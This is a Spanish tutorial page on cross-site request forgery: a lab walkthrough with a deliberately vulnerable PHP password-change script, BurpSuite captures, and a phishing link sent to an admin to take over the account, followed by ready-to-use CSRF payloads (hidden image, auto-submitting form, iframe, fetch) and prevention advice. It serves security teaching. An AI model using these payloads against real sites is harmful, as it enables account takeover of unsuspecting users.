---
icon: bells
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# CSRF (Cross-Site Request Forgery)

## Practica de explotación `CSRF`

Imaginemos que tenemos este archivo de aqui de esta pagina vulnerable:

> change\_pass.php

```php
<?php
session_start();
include 'database.php';
if (!isset($_SESSION['username'])) {
    header('Location: index.php');
    exit;
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' || $_SERVER['REQUEST_METHOD'] === 'GET') {
    if (isset($_REQUEST['password']) && isset($_REQUEST['confirm_password']) && $_REQUEST['password'] === $_REQUEST['confirm_password']) {
        $newpass = $_REQUEST['password'];
        $username = $_SESSION['username'];
        $stmt = $pdo->prepare("UPDATE users SET password=? WHERE username=?");
        $stmt->execute([$newpass, $username]);
        header('Location: dashboard.php');
        exit;
    } else {
        echo "Las contraseñas no coinciden.";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; }
        .container { max-width: 400px; margin: auto; padding: 20px; border: 1px solid #ccc; border-radius: 5px; background: #f9f9f9; }
    </style>
</head>
<body>
    <br><br><br><br><br><br><br><br><br><br>
    <div class="container">
        <h2>Cambiar contraseña</h2>
        <form method="post">
            <label>Nueva contraseña:</label>
	   <br><br>
            <input type="password" name="password" required><br><br>
            <label>Confirmar contraseña:</label><br><br>
            <input type="password" name="confirm_password" required><br><br>
            <button type="submit" name="submit">Cambiar</button>
        </form>
    </div>
</body>
</html>
```

Vemos que tiene una posible vulnerablidad de `CSRF` ya que se puede enviar la peticion mediante `GET` en la propia `URL` para cambiar la contraseña del usuario, esto si se lo enviamos mediante una ataque de `phising` algun administrador o algun usuario, podremos cambiar la contraseña del mismo.

Hay un apartado en la pagina en el que podremos contactar con el `administrador` por lo que enviaremos dicha `URL` con el cambio de credenciales, para ver si funciona.

Primero iniciaremos sesion con el usuario que tengamos, si no tenemos uno nos `registraremos` en la pagina, una vez dentro entramos en el apartado de `cambiar contraseña`, ahora abriremos `BurpSuite` y capturaremos la peticion del cambio de contraseña, tendremos que ver algo asi:

```
POST /csrf_lab/change_pass.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/csrf_lab/change_pass.php
Cookie: PHPSESSID=eb6s7ui70a7lcpctue7hkb26s7
Upgrade-Insecure-Requests: 1
Priority: u=0, i

password=user123&confirm_password=user123&submit=
```

Pero nosotros lo queremos con una peticion `GET`, por lo que le daremos a la siguiente opcion en `BurpSuite` para cambiar la peticion a `GET`.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Y nos quedara algo asi:

```
GET /csrf_lab/change_pass.php?password=user123&confirm_password=user123&submit= HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/csrf_lab/change_pass.php
Cookie: PHPSESSID=eb6s7ui70a7lcpctue7hkb26s7
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Vemos que a la derecha del `GET` es como deberia de estar formado la peticion para cambiar una contraseña mediante `URL` por lo que nos copiaremos esto:

```
/csrf_lab/change_pass.php?password=user123&confirm_password=user123&submit=
```

Y ahora dejaremos de interceptar con `BurpSuite`, ahora le daremos a la opcion `Contactar admin`, dentro de esta pagina veremos un cuadro de texto en el que podremos enviarle un mensaje al `administrador` por lo que vamos a enviarle dicha `URL` para que cuando pinche se le cambie la contraseña:

```
URL = http://<IP>/csrf_lab/change_pass.php?password=user123&confirm_password=user123&submit=
```

Pegaremos esa `URL` y le daremos a `enviar`, ahora si volvemos al inicio de sesion y si ha pinchado el `admin` podremos ver que la contraseña se cambio a `user123`.

Si probamos a iniciar sesion con las siguiente credenciales:

```
User: admin
Pass: user123
```

Veremos que estamos dentro como el usuario `admin`, por lo que habria funcionado nuestro ataque de `CSRF`.

## Explicación detallada de `CSRF`

### **¿Qué es CSRF?**

El **Cross-Site Request Forgery (CSRF)** es una vulnerabilidad en aplicaciones web que permite a un atacante forzar a un usuario autenticado a realizar acciones en una aplicación sin su consentimiento.

CSRF **explota la confianza que tiene un sitio web en la sesión del usuario autenticado**, utilizando cookies o tokens de sesión ya almacenados en el navegador.

📌 **Ejemplo práctico:**

1. Un usuario **inicia sesión** en su cuenta bancaria en `bank.com` y el navegador almacena su sesión (cookie).
2. El atacante le envía un enlace malicioso o lo engaña para que haga clic en un botón en su página.
3. Ese enlace o botón envía una petición HTTP a `bank.com/transferir?cantidad=500&destino=cuenta_del_atacante`.
4. El navegador del usuario, **por estar autenticado**, envía la solicitud legítima sin preguntar.
5. Se realiza la transferencia sin que la víctima lo note.

### **¿Cómo se explota CSRF?**

CSRF se basa en **ingeniería social** (enlaces maliciosos, imágenes ocultas, formularios invisibles, JavaScript, etc.) para inducir a la víctima a realizar una petición maliciosa sin su consentimiento.

Las formas más comunes de ataque incluyen:

* **Enlaces maliciosos:** Engañar al usuario para que haga clic en un enlace que ejecuta una acción.
* **Formularios invisibles:** Usar un formulario HTML autoenviado para realizar una petición.
* **Peticiones GET o POST:** Aprovechar endpoints vulnerables que no verifican la autenticidad de la solicitud.

### **Ejemplo de Explotación CSRF**

#### **Ataque con Método GET**

Si un sitio permite cambiar el correo del usuario con solo visitar un enlace como este:

```
https://victima.com/change-email?email=atacante@gmail.com
```

El atacante podría engañar a la víctima para hacer clic en:

```html
<img src="https://victima.com/change-email?email=atacante@gmail.com" style="display:none;">
```

El navegador de la víctima **hará la solicitud automáticamente** sin que lo note.

***

#### **Ataque con Método POST usando un Formulario**

Si un sitio vulnerable permite cambiar la contraseña con una simple solicitud POST:

```html
<form action="https://victima.com/change-password" method="POST">
    <input type="hidden" name="password" value="Pwned123">
    <input type="hidden" name="confirm_password" value="Pwned123">
    <input type="submit" value="Hacer clic aquí para ganar un premio">
</form>
<script>
    document.forms[0].submit(); // Se envía automáticamente
</script>
```

Al abrir la página, el navegador de la víctima **cambiará la contraseña sin que se dé cuenta**.

***

### **📜 Tabla de Payloads y Bypasses**

| Payload                                                                                                                                   | Explicación                                                                                              |
| ----------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------- |
| `<img src="https://victima.com/action?param=malicious">`                                                                                  | Aprovecha una imagen oculta para enviar peticiones GET automáticamente.                                  |
| `<iframe src="https://victima.com/transferir?monto=1000&cuenta=evil">`                                                                    | Usa un iframe invisible para ejecutar la acción sin que la víctima lo vea.                               |
| `<form action="https://victima.com/update" method="POST"><input type="hidden" name="data" value="malicious"><input type="submit"></form>` | Envia una solicitud POST al servidor sin la interacción del usuario.                                     |
| `<script>fetch('https://victima.com/action', {method: 'POST', credentials: 'include'});</script>`                                         | Usa JavaScript para realizar una solicitud con cookies autenticadas (algunos navegadores bloquean esto). |
| `<link rel="prerender" href="https://victima.com/delete-account">`                                                                        | Carga automáticamente una página antes de que el usuario la visite, activando la acción maliciosa.       |
| `<meta http-equiv="refresh" content="0;url=https://victima.com/action?param=malicious">`                                                  | Redirige automáticamente a la víctima sin su consentimiento.                                             |

***

### **¿Cómo Prevenir CSRF?**

✅ **Implementar Tokens CSRF:**

* Cada solicitud sensible debe requerir un token único e impredecible.
* Este token se debe validar en el servidor antes de ejecutar la acción.

✅ **Usar el Header `SameSite` en las Cookies:**

* Configurar las cookies de sesión con `SameSite=Strict` evita que se envíen en peticiones CSRF.

✅ **Verificar el Header `Origin` y `Referer`:**

* Bloquear peticiones que no provengan del mismo dominio.

✅ **Usar Autenticación de Doble Factor (2FA):**

* Para evitar cambios críticos como modificar contraseñas o realizar transferencias bancarias.

✅ **Requerir Confirmación del Usuario:**

* Solicitar contraseñas o captchas en acciones sensibles.

***

### **Conclusión**

CSRF es una vulnerabilidad peligrosa que **aprovecha la sesión autenticada del usuario** para ejecutar acciones no autorizadas. Aunque es sencilla de explotar, **su prevención también es fácil** con medidas adecuadas como **tokens CSRF, SameSite Cookies y validación de origen**.

🛡️ **Siempre valida las peticiones y protege las acciones sensibles de tu aplicación web.**
